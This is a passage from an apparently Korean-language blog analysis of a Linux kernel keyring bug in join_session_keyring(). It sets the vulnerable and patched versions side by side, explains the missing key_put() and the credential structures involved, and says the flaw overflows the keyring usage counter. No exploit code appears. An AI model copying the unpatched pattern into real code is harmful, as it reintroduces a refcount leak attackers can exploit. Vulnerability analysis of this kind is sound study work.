</li>
<li><p>만약 하나의 keyring이 여러 프로세스에서 공유되고 있다면 usage라는 필드에 위치한 객체의 내부 reference count가 계속해서 증가하게 된다.</p>
</li>
</ul>
<h2 id="source-code-before-the-vulnerability-is-patched"><a href="#source-code-before-the-vulnerability-is-patched" class="headerlink" title="source code, before the vulnerability is patched"></a>source code, before the vulnerability is patched</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line">	<span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = prepare_creds();</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	old = current_cred();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* if no name is provided, install an anonymous keyring */</span></span><br><span class="line">	<span class="keyword">if</span> (!name) &#123;</span><br><span class="line">		ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">		serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">		ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">			ret = serial;</span><br><span class="line">		<span class="keyword">goto</span> okay;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* allow the user to join or create a named keyring */</span></span><br><span class="line">	mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* look for an existing keyring of this name */</span></span><br><span class="line">	keyring = find_keyring_by_name(name, <span class="literal">false</span>); <span class="comment">// find_keyring_by_name increments keyring usage if a keyring was found</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line">		<span class="comment">/* not found - try and create a new one */</span></span><br><span class="line">		keyring = keyring_alloc(</span><br><span class="line">			name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">			KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">			KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">			ret = PTR_ERR(keyring);</span><br><span class="line">			<span class="keyword">goto</span> error2;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123; </span><br><span class="line">		ret = PTR_ERR(keyring);</span><br><span class="line">		<span class="keyword">goto</span> error2; </span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">		ret = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* we&#x27;ve got a keyring - now to install it */</span></span><br><span class="line">	ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">	commit_creds(<span class="keyword">new</span>);</span><br><span class="line">	mutex_unlock(&amp;key_session_mutex); </span><br><span class="line"></span><br><span class="line">	ret = keyring-&gt;serial; </span><br><span class="line">	key_put(keyring); </span><br><span class="line">okay:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">	mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">	abort_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="source-code-after-the-vulnerability-is-patched"><a href="#source-code-after-the-vulnerability-is-patched" class="headerlink" title="source code, after the vulnerability is patched"></a>source code, after the vulnerability is patched</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line">	<span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = prepare_creds();</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	old = current_cred();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* if no name is provided, install an anonymous keyring */</span></span><br><span class="line">	<span class="keyword">if</span> (!name) &#123;</span><br><span class="line">		ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">		serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">		ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">			ret = serial;</span><br><span class="line">		<span class="keyword">goto</span> okay;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* allow the user to join or create a named keyring */</span></span><br><span class="line">	mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* look for an existing keyring of this name */</span></span><br><span class="line">	keyring = find_keyring_by_name(name, <span class="literal">false</span>);</span><br><span class="line">	<span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line">		<span class="comment">/* not found - try and create a new one */</span></span><br><span class="line">		keyring = keyring_alloc(</span><br><span class="line">			name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">			KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">			KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">			ret = PTR_ERR(keyring);</span><br><span class="line">			<span class="keyword">goto</span> error2;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">		ret = PTR_ERR(keyring);</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">		key_put(keyring);</span><br><span class="line">		ret = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* we&#x27;ve got a keyring - now to install it */</span></span><br><span class="line">	ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">	commit_creds(<span class="keyword">new</span>);</span><br><span class="line">	mutex_unlock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">	ret = keyring-&gt;serial;</span><br><span class="line">	key_put(keyring);</span><br><span class="line">okay:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">	mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">	abort_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> ret; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="the-difference-between-these-code"><a href="#the-difference-between-these-code" class="headerlink" title="the difference between these code"></a>the difference between these code</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Before</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">		ret = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//After</span></span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">		key_put(keyring); <span class="comment">//patched</span></span><br><span class="line">		ret = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>패치된 코드를 보면, else if 문에서 goto error2이전에 key_put(keyring)이라는 코드가 추가되었다.<h3 id="key-put"><a href="#key-put" class="headerlink" title="key_put()"></a>key_put()</h3></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key_put</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (key) &#123;</span><br><span class="line">		key_check(key);</span><br><span class="line">		<span class="keyword">if</span> (refcount_dec_and_test(&amp;key-&gt;usage))</span><br><span class="line">			schedule_work(&amp;key_gc_work);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(key_put);</span><br></pre></td></tr></table></figure>
<ul>
<li><p>key_put 함수는 해당 keyring의 usage (<code>reference count</code>) 를 감소시키는 역할을 한다.</p>
</li>
<li><p>추가적으로 <code>reference count</code>가 0이 되어 더이상 사용되지 않는 메모리가 된다면, 해당 포인터를 리눅스의 Garbage Colllector가 free 시킨다.</p>
</li>
</ul>
<h1 id="source-code-analysis"><a href="#source-code-analysis" class="headerlink" title="source code analysis"></a>source code analysis</h1><ul>
<li>join_session_keyring 함수를 크게 세 부분으로 나눠서 분석하겠다.<h2 id="part-1-cred-구조체-초기화"><a href="#part-1-cred-구조체-초기화" class="headerlink" title="part 1 : cred 구조체 초기화"></a>part 1 : cred 구조체 초기화</h2></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">join_session_keyring</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line">	<span class="keyword">long</span> ret, serial;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = prepare_creds();</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	old = current_cred();</span><br></pre></td></tr></table></figure>
<ul>
<li>join_session_keyring 함수가 호출되면 prepare_creds()함수를 통해 수정용 cred 구조체 new를 초기화 해준다.</li>
<li>current_cred()를 통해 현재 작업의 subjective credentials를 액세스 한다.</li>
</ul>
<h3 id="prepare-creds"><a href="#prepare-creds" class="headerlink" title="prepare_creds()"></a>prepare_creds()</h3><p><img src="https://user-images.githubusercontent.com/70257118/98334793-07c43c80-2047-11eb-98a0-adaaee9c304d.png" alt="제목 없음"></p>
<ul>
<li>Task의 creds는 직접적으로 수정할 수 없어 반드시 copy 후 수정해야 한다.</li>
<li>prepare_creds()를 호출하여 copy를 준비 한다. (new = prepare_creds())</li>
<li>수정 후 commit_creds()를 호출하여 커밋한다. (commit_creds(new))</li>
</ul>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	validate_process_creds();</span><br><span class="line">	<span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line">	old = task-&gt;cred;</span><br><span class="line">	<span class="built_in">memcpy</span>(<span class="keyword">new</span>, old, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line">	atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">	get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line">	get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">	get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	key_get(<span class="keyword">new</span>-&gt;session_keyring); 	</span><br><span class="line">	key_get(<span class="keyword">new</span>-&gt;process_keyring);</span><br><span class="line">	key_get(<span class="keyword">new</span>-&gt;thread_keyring);</span><br><span class="line">	key_get(<span class="keyword">new</span>-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	validate_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line">error:</span><br><span class="line">	abort_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li> 수정용 cred 구조체를 만들어 return 해준다.</li>
</ul>
<h3 id="what-is-struct-cred"><a href="#what-is-struct-cred" class="headerlink" title="what is struct cred?"></a>what is struct cred?</h3><p><img src="https://user-images.githubusercontent.com/70257118/98340730-2cbdad00-2051-11eb-8409-1ff1950ac625.png" alt="1"></p>
<ul>
<li>Credentials : 자격증명</li>
<li>Linux에서는 다음과 같은 Credentials들을 <code>struct cred</code>를 통해 관리한다.<br>  Traditional UNIX credentials.<br>  Capabilities.<br>  Secure management flags (securebits).<br>  Keys and keyrings.<br>  LSM<br>  AF_KEY </li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h3 id="real-cred-vs-cred"><a href="#real-cred-vs-cred" class="headerlink" title="real_cred vs cred"></a>real_cred vs cred</h3><ul>
<li>linux에서는 한 task가 다른 task에 접근할 때 작용하는 권한과, 다른 task가 이 task에 접근하기 위해서 가지고 있어야 하는 권한을 분리해 놓았다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *	task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *	upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>real_cred (1) : 다른 task가 이 task에 접근하기 위해서 가지고 있어야 하는 권한을 의미한다.</li>
<li>cred (2) : 이 task가 다른 task에 접근하거나, 특정 작업을 수행할 때 행사하는 권한을 의미한다.</li>
</ul>
<h2 id="part2-name이-NULL일-경우"><a href="#part2-name이-NULL일-경우" class="headerlink" title="part2 : name이 NULL일 경우"></a>part2 : name이 NULL일 경우</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">	ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">	ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">		ret = serial;</span><br><span class="line">	<span class="keyword">goto</span> okay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>join_session_keyring()함수의 인자인 name이 없다면, install_session_keyring_to_cred() 함수를 호출한다.</li>
<li>수정후 commit_creds(new)호출을 통해 수정된 cred를 커밋 시킨다.</li>
</ul>
<h3 id="install-session-keyring-to-cred"><a href="#install-session-keyring-to-cred" class="headerlink" title="install_session_keyring_to_cred"></a>install_session_keyring_to_cred</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Install a session keyring directly to a credentials struct.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">install_session_keyring_to_cred</span><span class="params">(struct cred *cred, struct key *keyring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">old</span>;</span></span><br><span class="line"></span><br><span class="line">	might_sleep();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create an empty session keyring */</span></span><br><span class="line">	<span class="keyword">if</span> (!keyring) &#123;</span><br><span class="line">		flags = KEY_ALLOC_QUOTA_OVERRUN;</span><br><span class="line">		<span class="keyword">if</span> (cred-&gt;session_keyring)</span><br><span class="line">			flags = KEY_ALLOC_IN_QUOTA;</span><br><span class="line"></span><br><span class="line">		keyring = keyring_alloc(<span class="string">&quot;_ses&quot;</span>, cred-&gt;uid, cred-&gt;gid, cred,</span><br><span class="line">					KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ,</span><br><span class="line">					flags, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(keyring))</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(keyring);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		__key_get(keyring);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* install the keyring */</span></span><br><span class="line">	old = cred-&gt;session_keyring;</span><br><span class="line">	rcu_assign_pointer(cred-&gt;session_keyring, keyring);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (old)</span><br><span class="line">		key_put(old);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>install_session_keyring_to_cred()함수의 역할은 cred 구조체에 직접적으로 session keyring을 등록한다.</li>
<li>즉, install_session_keyring_to_cred(new,NULL)은 익명의 keyring을 만들고, 이 keyring을 new cred에 등록한다.</li>
</ul>
<h2 id="part3-name이-NULL이-아닐-경우"><a href="#part3-name이-NULL이-아닐-경우" class="headerlink" title="part3 : name이 NULL이 아닐 경우"></a>part3 : name이 NULL이 아닐 경우</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">	mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">	keyring = find_keyring_by_name(name, <span class="literal">false</span>); </span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line">		keyring = keyring_alloc(</span><br><span class="line">			name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">			KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">			KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">			ret = PTR_ERR(keyring);</span><br><span class="line">			<span class="keyword">goto</span> error2;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123; </span><br><span class="line">		ret = PTR_ERR(keyring);</span><br><span class="line">		<span class="keyword">goto</span> error2; </span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">		ret = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">	commit_creds(<span class="keyword">new</span>);</span><br><span class="line">	mutex_unlock(&amp;key_session_mutex); </span><br><span class="line"></span><br><span class="line">	ret = keyring-&gt;serial; </span><br><span class="line">	key_put(keyring); </span><br><span class="line">okay:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">	mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">	abort_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>mutex_lock을 통해 자원 접근을 막는다.</li>
<li>find_keyring_by_name 함수를 호출해 같은 name의  keyring이 있는지 확인한다.</li>
<li>이름이 없다면, <ul>
<li>해당 name으로 keyring을 만든다. (keyring_alloc)</li>
<li>만든 keyring을 cred 구조체 new에 등록한다. (install_session_keyring_to_cred)</li>
<li>수정한 내용을 커밋한다. (commit_creds)</li>
<li>뮤텍스를 해제한다. (mutex_unlock)</li>
<li>keyring-&gt;usage를 감소시킨다. (key_put)</li>
<li>새로 생성한 keyring-&gt;serial을 반환한다.</li>
</ul>
</li>
<li>이름이 있다면,<ul>
<li>goto error2로 이동한다.  </li>
<li>뮤텍스를 해제한다.</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">	ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>여기서 해당 부분이 취약점을 일으키는데, keyring의 이름이 현재 session의 keyring과 같으면 바로 goto error2로 이동하게 된다.</li>
<li>이 과정에서 keyring-&gt;usage에 대한 Integer OverFlow가 발생한다.</li>
<li>어떻게 취약점이 발생하는지 알기 위해서는 먼저 find_keyring_by_name 함수를 알아야 한다.</li>
</ul>
